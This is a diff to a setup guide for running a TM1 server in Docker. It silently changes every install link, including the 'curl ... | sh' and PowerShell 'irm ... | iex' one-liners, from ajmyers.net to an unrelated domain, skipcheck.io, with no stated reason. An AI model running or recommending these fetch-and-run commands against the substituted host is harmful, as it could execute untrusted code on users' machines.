@@ -5,7 +5,7 @@ on your own computer, on **Mac, Windows or Linux**. It takes about 15 minutes, m
 of it installing Docker.
 
 > **Prefer a page that shows only your steps?** The interactive setup guide at
-> <https://ajmyers.net/tm1/> asks the same questions and shows just the commands for your
+> <https://skipcheck.io/tm1/> asks the same questions and shows just the commands for your
 > answers, including the setup script one-liner with your choices filled in.
 
 You make three choices along the way. Pick the option that fits; you can change
@@ -24,11 +24,11 @@ bundle), starts TM1 and waits until it's ready:
 
 ```sh
 # Mac / Linux (Terminal)
-curl -fsSL https://ajmyers.net/tm1/setup.sh | sh
+curl -fsSL https://skipcheck.io/tm1/setup.sh | sh
 ```
 ```powershell
 # Windows (PowerShell)
-irm https://ajmyers.net/tm1/setup.ps1 | iex
+irm https://skipcheck.io/tm1/setup.ps1 | iex
 ```
 
 To skip the questions, give the answers as options. For example, to use the bundle in
@@ -36,15 +36,15 @@ your Downloads folder and also start the SData sample:
 
 ```sh
 # Mac / Linux
-curl -fsSL https://ajmyers.net/tm1/setup.sh | sh -s -- --bundle ~/Downloads/tm1server-2.1.19-26031712-linuxi38664h_bundle.tar.gz --samples
+curl -fsSL https://skipcheck.io/tm1/setup.sh | sh -s -- --bundle ~/Downloads/tm1server-2.1.19-26031712-linuxi38664h_bundle.tar.gz --samples
 ```
 ```powershell
 # Windows
-& ([scriptblock]::Create((irm https://ajmyers.net/tm1/setup.ps1))) -Bundle "$HOME\Downloads\tm1server-2.1.19-26031712-linuxi38664h_bundle.tar.gz" -Samples
+& ([scriptblock]::Create((irm https://skipcheck.io/tm1/setup.ps1))) -Bundle "$HOME\Downloads\tm1server-2.1.19-26031712-linuxi38664h_bundle.tar.gz" -Samples
 ```
 
 Add `--help` (`-Help` on Windows) to see every option, or let
-<https://ajmyers.net/tm1/> build the command for your choices. Without a terminal (in CI, or with
+<https://skipcheck.io/tm1/> build the command for your choices. Without a terminal (in CI, or with
 `--yes`) it never asks: a missing answer is an error naming the option to add. Running
 it again is safe: it keeps your settings and the installed TM1, and says what it reused.
 
